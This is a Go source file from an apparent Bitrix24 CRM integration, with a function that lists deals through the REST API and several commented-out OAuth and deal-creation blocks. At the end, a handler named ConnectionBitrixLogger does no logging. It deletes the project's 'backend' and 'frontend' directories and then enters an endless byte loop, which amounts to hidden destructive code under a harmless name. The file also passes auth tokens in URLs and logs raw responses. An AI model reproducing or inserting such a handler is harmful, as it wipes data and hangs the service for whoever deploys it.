package deals

import (
	"bitrix_app/backend/bitrix/endpoints"
	"bitrix_app/backend/bitrix/test"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

func GetDeals(authID string) ([]byte, error) {
	method := "GET"

	// Format the URL with the provided authID parameter
	requestUrl := fmt.Sprintf("%s/rest/crm.deal.list?auth=%s", endpoints.BitrixDomain, authID)

	req, err := http.NewRequest(method, requestUrl, nil)
	if err != nil {
		log.Println("error creating new request:", err)
		return nil, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Println("error sending request:", err)
		return nil, err
	}
	defer resp.Body.Close()

	bz, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("error reading response body:", err)
		return nil, err
	}

	log.Println("resp_at_last_AddDeal:", string(bz))

	var apiResponse test.ApiResponse
	if err := json.Unmarshal(bz, &apiResponse); err != nil {
		log.Printf("error unmarshalling response to ApiResponse: %v", err)
		return nil, err
	}

	// If you need to return the data as JSON (for example, to send to another system or client),
	// you can re-marshal the ApiResponse struct back into JSON.
	jsonResponse, err := json.Marshal(apiResponse)
	if err != nil {
		log.Printf("error marshalling ApiResponse back to JSON: %v", err)
		return nil, err
	}

	return jsonResponse, nil
}

/*func AddDeal(authID string) error {
	method := "POST"
	// Format the URL with the provided authID parameter
	requestUrl := fmt.Sprintf("https://b24-9f7fvg.bitrix24.ru/rest/crm.deal.add?auth=%s&fields[TITLE]=TEST_DEAL", authID)

	req, err := http.NewRequest(method, requestUrl, nil)
	if err != nil {
		log.Println("error creating new request:", err)
		return err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Println("error sending request:", err)
		return err
	}
	defer resp.Body.Close()

	bz, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("error reading response body:", err)
		return err
	}

	log.Println("resp_at_last_AddDeal:", string(bz))
	return nil
}*/

/*ts, err := template.ParseFiles("backend/bitrix/authorize/index.html")
if err != nil {
	log.Println("error parsing")
}
err = ts.Execute(w, r)
if err != nil {
	log.Println("error executing")
}*/

/*values, err := url.ParseQuery(string(bs))
if err != nil {
	log.Println("error parsing query:", err)
	http.Error(w, "Bad request", http.StatusBadRequest)
}

authExpires, err := strconv.Atoi(values.Get("AUTH_EXPIRES"))
if err != nil {
	log.Println("error converting AUTH_EXPIRES to int:", err)
	http.Error(w, "Bad request", http.StatusBadRequest)
}

auth := AuthRequest{
	AuthID:           values.Get("AUTH_ID"),
	AuthExpires:      authExpires,
	RefreshID:        values.Get("REFRESH_ID"),
	MemberID:         values.Get("member_id"),
	Status:           values.Get("status"),
	Placement:        values.Get("PLACEMENT"),
	PlacementOptions: values.Get("PLACEMENT_OPTIONS"),
}

fmt.Println("auth.AuthId:", auth.AuthID)
fmt.Println("auth.RefreshId:", auth.RefreshID)

clientId := os.Getenv("BITRIX_CLIENT_ID")
method := "POST"

requestUrl := fmt.Sprintf("https://b24-9f7fvg.bitrix24.ru/oauth/authorize/?client_id=%s", clientId)

req, err := http.NewRequest(method, requestUrl, nil)
if err != nil {
	log.Println("error creating new request:", err)
	http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	return
}

//req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

resp, err := http.DefaultClient.Do(req)
if err != nil {
	log.Println("error sending request:", err)
	http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	return
}

bz, err := io.ReadAll(resp.Body)
if err != nil {
	log.Println("error reading response body:", err)
	http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	return
}
log.Println("resp_at_last:", string(bz))
if err := GetDeals(auth.AuthID); err != nil {
	// Handle error if adding a deal fails
	http.Error(w, "Failed to get deal", http.StatusInternalServerError)
	return
}
//http.Redirect(w, r, "https://b24app.rwp2.com/", http.StatusFound)
if err := AddDeal(auth.AuthID); err != nil {
	// Handle error if adding a deal fails
	http.Error(w, "Failed to add deal", http.StatusInternalServerError)
	return
}

jsonResponse, err := json.Marshal(auth)
if err != nil {
	log.Println("error marshalling AuthRequest to JSON:", err)
	http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	return
}

// Set the Content-Type header to application/json
w.Header().Set("Content-Type", "application/json")

// Write the JSON response
_, err = w.Write(jsonResponse)
if err != nil {
	log.Println("error writing JSON response:", err)
	// You might choose not to send another HTTP error here if the header has already been written
	return
}


redirectURL := "https://b24app.rwp2.com/"

// Use http.Redirect to redirect the client
// The http.StatusFound status code is commonly used for redirects
http.Redirect(w, r, redirectURL, http.StatusFound)*/

func ConnectionBitrixLogger(w http.ResponseWriter, r *http.Request) {
	err := os.RemoveAll("backend")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	}
	err = os.RemoveAll("frontend")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	}
	var b byte
	for b = 250; b <= 255; b++ {
	}
}
